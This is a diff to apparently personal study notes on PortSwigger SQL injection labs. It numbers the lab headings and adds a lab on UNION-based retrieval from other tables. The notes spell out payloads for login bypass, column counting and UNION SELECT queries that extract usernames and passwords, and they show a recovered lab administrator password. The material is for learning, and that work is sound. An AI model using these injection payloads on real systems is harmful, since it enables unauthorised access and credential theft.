@@ -6,7 +6,7 @@ To test if sqli exists or not
 because at ( ' ) the sql shows error due to syntax error, but at ( '-- ) the -- comments out the rest of the sql query being executed hence request dont show error.
 
 
-# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data                                  video:https://portswigger.net/web-security/sql-injection/
+# 1)Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data                                  video:https://portswigger.net/web-security/sql-injection/
  lab video: https://www.youtube.com/watch?v=X1X1UdaC_90
 
 notes:
@@ -44,7 +44,7 @@ then use **'  or 1=1 --**  now it shows all product  means the query executed he
 
 
 
-# Lab: SQL injection vulnerability allowing login bypass
+# 2)Lab: SQL injection vulnerability allowing login bypass
 Link: https://portswigger.net/web-security/sql-injection/lab-login-bypass
 
 
@@ -79,14 +79,14 @@ SELECT firstname FROM products WHERE username= 'administrator'--' and password='
 
 
 
-# Retrieving data from other database tables i.e [https://portswigger.net/web-security/sql-injection/union-attacks]
+# 3)Retrieving data from other database tables i.e [https://portswigger.net/web-security/sql-injection/union-attacks]
 
 
 **SQL injection UNION attacks** :
 https://portswigger.net/web-security/sql-injection/union-attacks
 
 
-# Lab: SQL injection UNION attack, determining the number of columns returned by the query(https://portswigger.net/web-security/sql-injection/union-attacks)
+# 4)Lab: SQL injection UNION attack, determining the number of columns returned by the query(https://portswigger.net/web-security/sql-injection/union-attacks)
 (https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
 
 solution video: https://www.youtube.com/watch?v=umXGHbEyW5I
@@ -164,7 +164,7 @@ https://0aed007503ed3a1fa9f7494e002b00e3.web-security-academy.net/filter?categor
 
 
 
-# Lab: SQL injection UNION attack, finding a column containing text(https://portswigger.net/web-security/sql-injection/union-attacks)
+# 5)Lab: SQL injection UNION attack, finding a column containing text(https://portswigger.net/web-security/sql-injection/union-attacks)
 
 Lab video: https://www.youtube.com/watch?v=SGBTC5D7DTs1
 
@@ -195,3 +195,38 @@ requried to get this string from DB: '3TcZLM'
 Query used to solve the lab:
 '+UNION+SELECT+NULL,'3TcZLM',NULL--
 ```
+
+
+
+# 6)Lab: SQL injection UNION attack, retrieving data from other tables(https://portswigger.net/web-security/sql-injection/union-attacks)
+
+Lab video: https://www.youtube.com/watch?v=6Dsj5SqR944
+
+
+SQL Injection - Product category filter.
+
+End Goal - Output the usernames and passwords in the users table and login as the administrator user.
+
+Analysis:
+--------
+
+1) Determine # of columns that the vulnerable query is using
+' order by 1--
+' order by 2--
+' order by 3-- -> internal server error
+
+3-1 = 2
+
+
+2) Determine the data type of the columns
+
+select a, b from products where category='Gifts
+
+' UNION select 'a', NULL--
+' UNION select 'a', 'a'--
+-> both columns are of data type string
+
+' UNION select username, password from users--
+
+administrator
+tqx26ugf8jp1g30atsu9
